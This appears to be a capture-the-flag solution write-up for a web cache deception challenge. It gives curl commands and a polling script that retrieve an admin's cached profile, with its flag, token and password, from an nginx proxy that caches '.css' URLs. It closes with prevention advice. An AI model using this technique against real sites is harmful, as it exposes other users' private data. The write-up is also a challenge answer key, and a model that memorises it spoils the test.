# Solution: Cache Deception (web-cache-deception)

## Vulnerability

**Web Cache Deception**: The nginx proxy caches responses for URLs ending in
static file extensions (`.css`, `.js`, etc.) without considering the response
Content-Type or whether the content is user-specific.

The Flask app serves `/profile/info.css` identically to `/profile/info` —
returning the user's profile JSON (including the flag for admin).

When the admin bot visits `/profile/info.css`, nginx caches the response.
The next request to `/profile/info.css` (from the attacker) gets the
cached admin response, bypassing authentication entirely.

## Attack Flow

```
Attacker               Nginx                 Webapp (Flask)
   |                     |                        |
   |  GET /profile/info.css (no auth)             |
   |-------------------->|                        |
   |                     | MISS — forward         |
   |                     |----------------------->|
   |                     |   Returns 401/redirect |
   |                     |<-----------------------|
   |  401 or redirect    |                        |
   |<--------------------|  Cache: MISS           |
   |                     |  (not cached — 401?)   |
   |                     |                        |
   |   [Admin bot visits /profile/info.css]       |
   |                 ADMIN|----------------------->|
   |                     |   Returns 200 JSON     |
   |                     |   {flag: "HL4{...}"}   |
   |                     |<-----------------------|
   |                     | CACHE: STORE (60s TTL) |
   |                     |                        |
   |  GET /profile/info.css (no auth, after admin)|
   |-------------------->|                        |
   |                     | HIT — serve from cache |
   |  200 + {flag: ...}  |                        |
   |<--------------------|                        |
```

## Exploit Steps

### Step 1: Wait for or confirm admin bot activity

The admin bot visits `/profile/info.css` every 30 seconds while authenticated.
Check nginx cache status:

```bash
TARGET="http://<TARGET_IP>:8080"

# Probe the endpoint
curl -v "$TARGET/profile/info.css" 2>&1 | grep -E "(< HTTP|X-Cache|X-Served)"
# X-Cache-Status: MISS → cache not populated yet, admin bot hasn't visited
# X-Cache-Status: HIT  → cached response available
```

### Step 2: Request the cached admin response

```bash
# Wait ~30 seconds after the challenge starts for the admin bot's first visit
# Then immediately request:

curl -s "$TARGET/profile/info.css" | python3 -m json.tool
```

Expected output:
```json
{
  "username": "admin",
  "role": "admin",
  "email": "admin@corp.internal",
  "flag": "HL4{...}",
  "admin_token": "...",
  "db_password": "..."
}
```

### Step 3: If cache miss, trigger admin bot manually

The admin bot runs automatically. But if you need to force it:
- The bot logs in via `/login` and visits `/profile/info.css`
- You can observe nginx cache status via `X-Cache-Status` header

```bash
# Rapid polling script
while true; do
  RESULT=$(curl -s -w "\n%{http_code}" "$TARGET/profile/info.css")
  STATUS=$(echo "$RESULT" | tail -1)
  BODY=$(echo "$RESULT" | head -n -1)
  CACHE=$(curl -sI "$TARGET/profile/info.css" | grep -i x-cache)
  echo "Status: $STATUS | $CACHE"
  if echo "$BODY" | grep -q "flag"; then
    echo "FLAG CAPTURED:"
    echo "$BODY" | python3 -m json.tool
    break
  fi
  sleep 5
done
```

## Why the Cache Ignores Authentication

The nginx config has:
```nginx
location ~* \.(css|js|png|...)$ {
    proxy_cache corp_cache;
    proxy_cache_key "$scheme$request_method$host$request_uri";
    proxy_ignore_headers Set-Cookie;   # Cookies not part of cache key
    proxy_hide_header Set-Cookie;      # Strips cookies from cached response
    ...
}
```

The cache key only includes URI — not the session cookie. So admin's
authenticated response gets served to unauthenticated requesters.

## Prevention
- Check Content-Type before caching (only cache `text/css`, `image/*`, etc.)
- Include `Vary: Cookie` in cache key for sensitive endpoints
- Ensure `/profile/info.css` returns 404 or redirects (don't serve dynamic content)
- Use `Cache-Control: no-store, private` on all authenticated responses
